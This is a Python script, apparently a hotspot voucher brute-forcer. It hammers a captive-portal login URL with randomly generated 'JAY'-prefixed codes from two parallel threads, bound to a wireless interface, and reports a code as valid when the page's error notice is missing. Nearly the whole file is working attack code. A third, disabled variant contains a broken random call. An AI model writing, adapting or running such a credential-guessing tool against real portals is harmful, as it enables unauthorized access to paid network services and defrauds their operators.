#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# OpenSource2022 
# Copyright By System╳
#####################################################
from code import interact
from sqlite3 import InterfaceError
import string                                       #
import threading                                    #
import socket                                       #
import os                                           #
import urllib3                                      #
import random                                       #
import sys                                          #
import time                                         #
import datetime                                     #
import requests                                     #
from bs4 import BeautifulSoup                       #
                                                    #
#COLOR                                              #
G = "\033[0;32m"                                    #
GI = "\033[0;32;3m"                                 #
B = "\033[0;36;1m"                                  #
BI = "\033[0;36;3m"                                 #
R = "\033[0;31m"                                    #
RI = "\033[31;3m"                                   #
Y = "\033[33;1m"                                    #
YI = "\033[33;1;3m"                                 #
W = "\033[37;1m"                                    #
WI = "\033[37;1;3m"                                 #
N = "\033[0m"                                       #
NI = "\033[0;3m"                                    #
#####################################################



class HTTPAdapterWithSocketOptions(requests.adapters.HTTPAdapter):
    def __init__(self, *args, **kwargs):
        self.socket_options = kwargs.pop("socket_options", None)
        super(HTTPAdapterWithSocketOptions, self).__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        if self.socket_options is not None:
            kwargs["socket_options"] = self.socket_options
        super(HTTPAdapterWithSocketOptions, self).init_poolmanager(*args, **kwargs)

interface = 'wlan1'
adapter = HTTPAdapterWithSocketOptions(socket_options=[(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface.encode('utf-8'))])
session = requests.session()
session.mount("http://", adapter)
session.mount("https://", adapter)

url = "http://jay.net/login/"


def Conn1(url):
    i=0
    while 1:
        i+=1
        n=1
        c=4
        Start= 10**(n-1)
        End= (10**n)-1
        Num= random.randint(Start,End)
        Text= string.ascii_letters
        txt=''.join(random.choice(Text) for i in range(c))
        def Value(v="JAY"):
            V= random.randint(3,6)
            vl= "JAY{}{}{}".format(V,Num, txt)
            return (vl)
        passwd = Value()
        # print (passwd)
        data= {
            'username': passwd,
            'dst' : '&',
            'popup': 'true',
            # 'submit': "LOGIN",
        }
        r = session.post(url, data=data)

        Soup = BeautifulSoup(r.text, 'html.parser')
        print(YI+'Trying'+G+' ==> '+W+'['+N+' {} '.format(passwd) +W+']' +W+' ['+B+ '{}'.format(i)+ '' +W+']'+N)
        info = Soup.find('div', class_=["notice"])
        if info:
                continue
        else:
            Rdr= requests.get(url)
            print (G+'The Voucher is '+W+'['+G+' {} '.format(passwd)+W+']'+N)
            print (G+'REDIRECTED TO '+Y+'==> '+YI+'{}'.format(Rdr.url) + '' +N)
            break
def Conn2(url):
    i=0
    while 1:
        i+=1
        n=1
        c=4
        Start= 10**(n-1)
        End= (10**n)-1
        Num= random.randint(Start,End)
        Text= string.ascii_letters
        txt=''.join(random.choice(Text) for i in range(c))
        def Value(v="JAY"):
            V= random.randint(3,6)
            vl= "JAY{}{}{}".format(V,Num, txt)
            return (vl)
        passwd = Value()
        data= {
            'username': passwd,
            'dst' : '&',
            'popup': 'true',
            # 'submit': 'LOGIN',
        }
        r = session.post(url, data=data)

        Soup = BeautifulSoup(r.text, 'html.parser')
        print(GI+'Trying'+G+' ==> '+W+'['+N+' {} '.format(passwd) +W+']' +W+' ['+B+ '{}'.format(i)+ '' +W+']'+N)
        info = Soup.find('div', class_=["notice"])
        if info:
                continue
        else:
            Rdr= requests.get(url)
            print (G+'The Voucher is '+W+'['+G+' {} '.format(passwd)+W+']'+N)
            print (G+'REDIRECTED TO '+Y+'==> '+YI+'{}'.format(Rdr.url) + '' +N)
            break

def Conn3(url):
    i=0
    while 1:
        i+=1
        n=1
        c=1
        Start= 10**(n-1)
        End= (10**n)-1
        Num= random.randint(Start,End)
        Text= string.ascii_letters
        txt=''.join(random.choice(Text) for i in range(c))
        def Value(v="JAY"):
            V= random.randint(3,6)
            vl= "JAY{}{}{}{}{}{}".format(V,txt,Num,txt,Num,txt)
            vl2= "JAY{}{}{}{}{}{}".format(V,Num,Num,txt,Num,txt)
            vl3= "JAY{}{}{}{}{}{}".format(V,Num,txt,Num,txt,Num)
            vl4= "JAY{}{}{}{}{}{}".format(V,txt,txt,txt,Num,txt)
            vl5= "JAY{}{}{}{}{}{}".format(V,Num,txt,Num,Num,txt)
            mix= vl + vl2 + vl3 + vl4 + vl5
            vlb= random.random(mix)
            return (vlb)
        passwd = Value()
        data= {
            'username': passwd,
            # 'dst' : '&',
            # 'popup': 'true',
            'submit': 'LOGIN',
        }
        r = session.post(url, data=data)

        Soup = BeautifulSoup(r.text, 'html.parser')
        print(RI+'Trying'+G+' ==> '+W+'['+N+' {} '.format(passwd) +W+']' +W+' ['+B+ '{}'.format(i)+ '' +W+']'+N)
        info = Soup.find('div', class_=["notice"])
        if info:
                continue
        else:
            Rdr= requests.get(url)
            print (G+'The Voucher is '+W+'['+G+' {} '.format(passwd)+W+']'+N)
            print (G+'REDIRECTED TO '+Y+'==> '+YI+'{}'.format(Rdr.url) + '' +N)
            break

if __name__== "__main__":
    # Conn1(url)

    t1 = threading.Thread(target=Conn1, args=(url, ))
    t2 = threading.Thread(target=Conn2, args=(url, ))
    # t3 = threading.Thread(target=Conn3, args=(url, ))
    t1.start()
    t2.start()
    # t3.start()
    t1.join()
    t2.join()
    # t3.join()
    





















# passwd = 1234

# def Connection1(url, passwd):
#     data= {
#         'username': passwd,
#         'dst' : '&',
#         'popup': 'true',
#     }
#     r = session.post(url, data=data)

# Soup = BeautifulSoup(r.text, 'html.parser')
# info = Soup.find('div', class_=["notice"])

# if info:
#     n=1
#     c=4
#     Start= 10**(n-1)
#     End= (10**n)-1
#     Number= random.randint(Start,End)
#     Text= string.ascii_letters
#     txt=''.join(random.choice(Text) for i in range(c))
#     def Value(v="JAY"):
#         V= random.randint(3,6)
#         vl= "JAY{}{}{}".format(V,Number, txt)
#         print (vl)
#         return (vl)
#     passwd = Value()

    # r = session.post(url, data=data)
    # Soup = BeautifulSoup(r.text, 'html.parser')
    # info = Soup.find('div', class_=["notice"])
    # if info:
    #     continue
    #  else:
    #     Rdr= requests.get(url)
    #     print (G+'The Voucher is '+W+'['+G+' {} '.format(generated)+W+']'+N)
    #     print (G+'REDIRECTED TO '+Y+'==> '+YI+'{}'.format(Rdr.url) + '' +N)
    #     break



# Str()
# Int()